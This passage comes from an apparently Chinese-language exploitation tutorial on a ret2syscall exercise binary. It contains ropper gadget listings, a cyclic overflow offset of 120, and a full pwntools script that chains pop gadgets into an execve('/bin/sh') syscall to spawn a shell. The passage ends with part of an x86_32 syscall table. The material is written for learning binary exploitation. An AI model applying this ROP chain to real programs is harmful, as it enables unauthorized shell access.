class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">(ret2syscall/ELF/x86_64)&gt; search syscall</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: syscall</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x00000000004003da: syscall; </span><br><span class="line">0x000000000046a96e: syscall; add rsp, 0x98; xor eax, eax; pop rbx; pop rbp; ret; </span><br><span class="line">0x000000000043f885: syscall; cmp rax, -0x1000; ja 0x3f8d0; add rsp, 0x60; pop rbx; ret; </span><br><span class="line">0x000000000046ac85: syscall; cmp rax, -0x1000; ja 0x6ac98; pop rbx; ret; </span><br><span class="line">0x000000000043f5a5: syscall; cmp rax, -0xfff; jae 0x44810; ret; </span><br><span class="line">0x000000000047e352: syscall; jmp 0x7e2a5; nop dword ptr [rax]; call rax; </span><br><span class="line">0x0000000000442b87: syscall; pop rdx; pop rsi; ret; </span><br><span class="line">0x000000000047cbed: syscall; <span class="built_in">test</span> edx, edx; jne 0x7cbcf; mov dword ptr fs:[0x2d0], eax; ret; </span><br><span class="line">0x0000000000467685: syscall; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rax</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rax</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x00000000004c3ecd: pop rax; add byte ptr [rax], al; nop; ret; </span><br><span class="line">0x000000000044faba: pop rax; add rax, 0x200; mov qword ptr fs:[rdx], rax; ret; </span><br><span class="line">0x00000000004c4c18: pop rax; <span class="keyword">in</span> eax, 0xf9; jmp rax; </span><br><span class="line">0x0000000000418b12: pop rax; mov dword ptr [rdi + 4], eax; ret; </span><br><span class="line">0x000000000049bd15: pop rax; mov eax, dword ptr [rbx + 8]; movsxd rax, dword ptr [r14 + rax*4]; add rax, r14; jmp rax; </span><br><span class="line">0x0000000000478856: pop rax; pop rdx; pop rbx; ret; </span><br><span class="line">0x00000000004bc790: pop rax; ret 0x4b; </span><br><span class="line">0x0000000000409b44: pop rax; ret 0xffff; </span><br><span class="line">0x00000000004c0858: pop rax; cmc; jmp qword ptr [rdi + 1]; </span><br><span class="line">0x00000000004bc808: pop rax; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rdi</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rdi</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x00000000004c45e5: pop rdi; add byte ptr [rax], al; <span class="built_in">test</span> al, 9; stc; call qword ptr [rsi + 0x2b]; </span><br><span class="line">0x000000000042c1ad: pop rdi; add eax, dword ptr [rax]; add byte ptr [rax - 0x7d], cl; ret 0x4910; </span><br><span class="line">0x00000000004886cd: pop rdi; and al, 0; jae 0x886df; mov rdx, qword ptr [rip + 0x24445e]; add word ptr [rdx + rax*2], 1; ret; </span><br><span class="line">0x0000000000431f29: pop rdi; <span class="keyword">in</span> al, dx; mov qword ptr [rdi - 0xc], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x0000000000431d39: pop rdi; <span class="keyword">in</span> eax, dx; mov qword ptr [rdi - 0xb], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x00000000004ba99e: pop rdi; insd dword ptr [rdi], dx; <span class="built_in">test</span> eax, 0x7d4c8c5d; ret 0xd8f; </span><br><span class="line">0x00000000004320fa: pop rdi; jmp 0x32145; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432142: pop rdi; jmp 0x3218d; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432180: pop rdi; jmp 0x321cb; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004321bc: pop rdi; jmp 0x32207; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004321f6: pop rdi; jmp 0x32241; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043222e: pop rdi; jmp 0x32279; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432256: pop rdi; jmp 0x322a1; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043227e: pop rdi; jmp 0x322c9; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004324fa: pop rdi; jmp 0xfffffffff152ae48; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432542: pop rdi; jmp 0xfffffffff152ae90; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432580: pop rdi; jmp 0xfffffffff152aece; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004325b8: pop rdi; jmp 0xfffffffff152af06; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004325f6: pop rdi; jmp 0xfffffffff152af44; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043262e: pop rdi; jmp 0xfffffffff152af7c; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432656: pop rdi; jmp 0xfffffffff152afa4; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043267e: pop rdi; jmp 0xfffffffff152afcc; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000441ab2: pop rdi; jmp rax; </span><br><span class="line">0x000000000043b50d: pop rdi; mov al, byte ptr [rsi]; add byte ptr [rcx + 0x63], cl; or al, 0x93; lea rcx, [r11 + rcx]; jmp rcx; </span><br><span class="line">0x00000000004b9961: pop rdi; mov dh, 0x4e; ret 0x474c; </span><br><span class="line">0x000000000049e57e: pop rdi; mov rax, rbx; pop rbx; pop rbp; pop r12; ret; </span><br><span class="line">0x0000000000431b59: pop rdi; out dx, al; mov qword ptr [rdi - 0xa], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x0000000000431989: pop rdi; out dx, eax; mov qword ptr [rdi - 9], r8; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x0000000000431a85: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov byte ptr [rdi - 1], dl; ret; </span><br><span class="line">0x00000000004319d1: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x000000000040224a: pop rdi; pop rbp; ret; </span><br><span class="line">0x00000000004c05a1: pop rdi; cmc; jmp qword ptr [rsi + 2]; </span><br><span class="line">0x0000000000401626: pop rdi; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rsi</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rsi</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x000000000042c0ae: pop rsi; add al, 0; add byte ptr [rax - 0x7d], cl; ret 0xe910; </span><br><span class="line">0x000000000044b242: pop rsi; add al, bpl; xchg byte ptr [rsi - 5], ah; jmp qword ptr [rsi + 0xf]; </span><br><span class="line">0x0000000000473e13: pop rsi; add dword ptr [rax], eax; add byte ptr [rax + 0x39], cl; ret 0xf48; </span><br><span class="line">0x000000000042642c: pop rsi; add dword ptr [rax], eax; ret; </span><br><span class="line">0x000000000047377c: pop rsi; add r8b, bpl; loope 0x7377b; jmp qword ptr [rsi + 0x2e]; </span><br><span class="line">0x00000000004886d6: pop rsi; and al, 0; add word ptr [rdx + rax*2], 1; ret; </span><br><span class="line">0x0000000000426ed2: pop rsi; and byte ptr [rbx + rcx*4 + 0x66], cl; sub byte ptr [rbx + rcx*4 + 0x6e], cl; xor byte ptr [rbx + rcx*4 + 0x76], cl; cmp byte ptr [rax + 0xf], cl; ret; </span><br><span class="line">0x000000000048f191: pop rsi; fmul st(0); ret; </span><br><span class="line">0x000000000048f10f: pop rsi; fmulp st(1); ret; </span><br><span class="line">0x000000000042cbb5: pop rsi; or byte ptr [rax - 0x7d], cl; ret 0x4801; </span><br><span class="line">0x0000000000441ab0: pop rsi; pop r15; jmp rax; </span><br><span class="line">0x0000000000402248: pop rsi; pop r15; pop rbp; ret; </span><br><span class="line">0x0000000000401624: pop rsi; pop r15; ret; </span><br><span class="line">0x00000000004b96dc: pop rsi; sar byte ptr [rip + 0x733db8a1], 0xd7; jo 0xb9757; mov ebp, 0xfb67d10d; ret; </span><br><span class="line">0x0000000000401747: pop rsi; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rdx</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rdx</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x0000000000426099: pop rdx; add byte ptr [rax + 0x43da10], dil; cmove rax, rdx; ret; </span><br><span class="line">0x00000000004c40dd: pop rdx; add byte ptr [rax], al; jo 0xc409b; clc; call qword ptr [rcx]; </span><br><span class="line">0x00000000004c40f5: pop rdx; add byte ptr [rax], al; js 0xc40b3; clc; call qword ptr [rsi]; </span><br><span class="line">0x00000000004269cb: pop rdx; add r11b, sil; ret; </span><br><span class="line">0x0000000000461e20: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1088], 1; mov rax, qword ptr [rax*8 + 0x4b3ba0]; jmp rax; </span><br><span class="line">0x0000000000460618: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1090], 1; mov rax, qword ptr [rax*8 + 0x4b39a0]; jmp rax; </span><br><span class="line">0x0000000000461b85: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10a0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x0000000000461d38: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10a8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x0000000000461cfa: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b0], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x00000000004606ae: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10b8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x00000000004606ec: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x10c8], 1; mov rax, qword ptr [rax*8 + 0x4b3ea0]; jmp rax; </span><br><span class="line">0x00000000004ba581: pop rdx; je 0xba548; ret 0xacfc; </span><br><span class="line">0x00000000004b93a4: pop rdx; jp 0xb9400; cmp byte ptr [rbx + rdi*2], bh; push -0x42; outsb dx, byte ptr [rsi]; call qword ptr [rcx - 0x66]; </span><br><span class="line">0x000000000047e4ee: pop rdx; or byte ptr [rcx + 3], cl; sbb al, byte ptr [rbx + 0xa3c0fe0]; jne 0x7e4ad; nop word ptr [rax + rax]; call rbx; </span><br><span class="line">0x00000000004bb547: pop rdx; out 0xf5, eax; mov ch, 0xab; ret; </span><br><span class="line">0x0000000000442b64: pop rdx; pop r10; ret; </span><br><span class="line">0x0000000000478857: pop rdx; pop rbx; ret; </span><br><span class="line">0x0000000000442b89: pop rdx; pop rsi; ret; </span><br><span class="line">0x000000000048f072: pop rdx; sub bh, dh; jmp qword ptr [rsi + 0x2e]; </span><br><span class="line">0x00000000004a3669: pop rdx; clc; jmp qword ptr [rax]; </span><br><span class="line">0x0000000000442b66: pop rdx; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop r10</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop r10</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x0000000000442b65: pop r10; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop r8</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop r8</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x0000000000418b11: pop r8; mov dword ptr [rdi + 4], eax; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop r9</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop r9</span><br></pre></td></tr></table></figure><p>搜完之后我们就去找溢出点了 如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> →   0x400a09 &lt;main+005b&gt;      ret    </span><br><span class="line">[!] Cannot disassemble from <span class="variable">$PC</span></span><br><span class="line">─────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: <span class="string">&quot;ret2syscall&quot;</span>, stopped 0x400a09 <span class="keyword">in</span> main (), reason: SINGLE STEP</span><br><span class="line">───────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x400a09 → main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  cyclic -l paaaaaaa</span><br><span class="line">Finding cyclic pattern of 8 bytes: b<span class="string">&#x27;paaaaaaa&#x27;</span> (hex: 0x7061616161616161)</span><br><span class="line">Found at offset 120</span><br></pre></td></tr></table></figure><p>泄漏点是 <code>120</code></p><p>然后我们接着通过 <code>ropper</code> 搜索 <code>/bin/sh</code> 如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(ret2syscall/ELF/x86_64)&gt; string /bin/sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Strings</span><br><span class="line">=======</span><br><span class="line"></span><br><span class="line">Address     Value    </span><br><span class="line">-------     -----    </span><br><span class="line">0x004a1384  /bin/sh</span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; </span><br></pre></td></tr></table></figure><p>还得搜索一个syscall</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(ret2syscall/ELF/x86_64)&gt; search syscall</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: syscall</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line"><span class="number">0x00000000004003da</span>: syscall; </span><br><span class="line"><span class="number">0x000000000046a96e</span>: syscall; add rsp, <span class="number">0x98</span>; xor eax, eax; pop rbx; pop rbp; ret; </span><br><span class="line"><span class="number">0x000000000043f885</span>: syscall; cmp rax, <span class="number">-0x1000</span>; ja <span class="number">0x3f8d0</span>; add rsp, <span class="number">0x60</span>; pop rbx; ret; </span><br><span class="line"><span class="number">0x000000000046ac85</span>: syscall; cmp rax, <span class="number">-0x1000</span>; ja <span class="number">0x6ac98</span>; pop rbx; ret; </span><br><span class="line"><span class="number">0x000000000043f5a5</span>: syscall; cmp rax, <span class="number">-0xfff</span>; jae <span class="number">0x44810</span>; ret; </span><br><span class="line"><span class="number">0x000000000047e352</span>: syscall; jmp <span class="number">0x7e2a5</span>; nop dword ptr [rax]; call rax; </span><br><span class="line"><span class="number">0x0000000000442b87</span>: syscall; pop rdx; pop rsi; ret; </span><br><span class="line"><span class="number">0x000000000047cbed</span>: syscall; test edx, edx; jne <span class="number">0x7cbcf</span>; mov dword ptr fs:[<span class="number">0x2d0</span>], eax; ret; </span><br><span class="line"><span class="number">0x0000000000467685</span>: syscall; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; </span><br></pre></td></tr></table></figure><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b main\nc&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = p64(<span class="number">0x4bc808</span>)</span><br><span class="line">pop_rdi = p64(<span class="number">0x401626</span>)</span><br><span class="line">pop_rsi = p64(<span class="number">0x401747</span>)</span><br><span class="line">pop_rdx = p64(<span class="number">0x442b66</span>)</span><br><span class="line">syscall = p64(<span class="number">0x467685</span>)</span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">bs = p64(<span class="number">0x004a1384</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 让 正常函数的ret返回到 pop_rax 处</span></span><br><span class="line">payload +=pop_rax + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload +=pop_rdi + bs</span><br><span class="line">payload +=pop_rsi + p64(<span class="number">0</span>)</span><br><span class="line">payload +=pop_rdx + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += syscall</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1. </p><h2 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h2><h3 id="x86-32-Syscall-table"><a href="#x86-32-Syscall-table" class="headerlink" title="x86_32 Syscall table"></a>x86_32 Syscall table</h3><table><thead><tr><th>Num</th><th>syscall</th><th>%eax</th><th>arg0 (%ebx)</th><th>arg1 (%ecx)</th><th>arg2 (%edx)</th><th>arg3 (%esi)</th><th>arg4 (%edi)</th><th>arg5 (%ebp)</th></tr></thead><tbody><tr><td>0</td><td>restart_syscall</td><td>0x00</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>1</td><td>exit</td><td>0x01</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>2</td><td>fork</td><td>0x02</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>3</td><td>read</td><td>0x03</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>4</td><td>write</td><td>0x04</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td>5</td><td>open</td><td>0x05</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td>6</td><td>close</td><td>0x06</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>7</td><td>waitpid</td><td>0x07</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>-</td><td>-</td><td>-</td></tr><tr><td>8</td><td>creat</td><td>0x08</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>9</td><td>link</td><td>0x09</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>10</td><td>unlink</td><td>0x0a</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>11</td><td>execve</td><td>0x0b</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td>12</td><td>chdir</td><td>0x0c</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>13</td><td>time</td><td>0x0d</td><td>time_t *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>14</td><td>mknod</td><td>0x0e</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td>-</td></tr><tr><td>15</td><td>chmod</td><td>0x0f</td><td>const char *filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>16</td><td>lchown</td><td>0x10</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td>17</td><td>break</td><td>0x11</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>18</td><td>oldstat</td><td>0x12</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>19</td><td>lseek</td><td>0x13</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td>20</td><td>getpid</td><td>0x14</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>21</td><td>mount</td><td>0x15</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td>-</td></tr><tr><td>22</td><td>umount</td><td>0x16</td><td>char *name</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>23</td><td>setuid</td><td>0x17</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>24</td><td>getuid</td><td>0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>25</td><td>stime</td><td>0x19</td><td>time_t *tptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>26</td><td>ptrace</td><td>0x1a</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td></tr><tr><td>27</td><td>alarm</td><td>0x1b</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>28</td><td>oldfstat</td><td>0x1c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>29</td><td>pause</td><td>0x1d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>30</td><td>utime</td><td>0x1e</td><td>char *filename</td><td>struct utimbuf *times</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>31</td><td>stty</td><td>0x1f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>32</td><td>gtty</td><td>0x20</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>33</td><td>access</td><td>0x21</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>34</td><td>nice</td><td>0x22</td><td>int increment</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>35</td><td>ftime</td><td>0x23</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>36</td><td>sync</td><td>0x24</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>37</td><td>kill</td><td>0x25</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>38</td><td>rename</td><td>0x26</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>39</td><td>mkdir</td><td>0x27</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>40</td><td>rmdir</td><td>0x28</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>41</td><td>dup</td><td>0x29</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>42</td><td>pipe</td><td>0x2a</td><td>int *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>43</td><td>times</td><td>0x2b</td><td>struct tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>44</td><td>prof</td><td>0x2c</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>45</td><td>brk</td><td>0x2d</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>46</td><td>setgid</td><td>0x2e</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>47</td><td>getgid</td><td>0x2f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>48</td><td>signal</td><td>0x30</td><td>int sig</td><td>__sighandler_t handler</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>49</td><td>geteuid</td><td>0x31</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>50</td><td>getegid</td><td>0x32</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>51</td><td>acct</td><td>0x33</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>52</td><td>umount2</td><td>0x34</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>53</td><td>lock</td><td>0x35</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>54</td><td>ioctl</td><td>0x36</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td>55</td><td>fcntl</td><td>0x37</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td>56</td><td>mpx</td><td>0x38</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>57</td><td>setpgid</td><td>0x39</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>58</td><td>ulimit</td><td>0x3a</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>59</td><td>oldolduname</td><td>0x3b</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td>60</td><td>umask</td><td>0x3c</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>61</td><td>chroot</td><td>0x3d</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>62</td><td>ustat</td><td>0x3e</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>63</td><td>dup2</td><td>0x3f</td><td>unsigned int oldfd</td><td>unsigned int 